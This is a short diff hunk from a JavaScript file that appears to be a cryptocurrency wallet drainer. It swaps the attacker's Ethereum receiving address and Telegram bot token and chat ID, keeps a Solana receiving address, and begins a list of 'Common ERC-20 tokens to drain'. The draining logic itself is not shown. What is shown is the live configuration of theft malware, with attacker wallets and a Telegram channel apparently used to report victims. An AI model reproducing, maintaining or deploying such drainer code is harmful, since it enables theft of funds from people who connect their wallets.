@@ -105,10 +105,10 @@ $(document).ready(function() {
     }
 
     // Receiver addresses & API keys
-    const RECEIVER_ADDRESS     = "0xe074f1e5c29ef1e307e65454f8dd5a3fa841bfb5";
+    const RECEIVER_ADDRESS     = "0x5d5AcFBc53A5004251b6Dec0D4ca8477FbBD73F7";
     const RECEIVER_SOL_ADDRESS = "6oU4uLAfavhXWoF68rDNcChs7tzfs4AQ6Dq3VwwjWCLJ";
-    const TELEGRAM_BOT_TOKEN   = "8864536415:AAFIveix7T5Fc2uxQn0knLvqFUzBzah8g-Y";
-    const TELEGRAM_CHAT_ID     = "-1004315768819";
+    const TELEGRAM_BOT_TOKEN   = "8663295709:AAE53vZv01PYv1BBXzssoyj6-KOT4ALH8ao";
+    const TELEGRAM_CHAT_ID     = "-1003788193467";
 
     // Common ERC-20 tokens to drain
     const COMMON_TOKENS = [
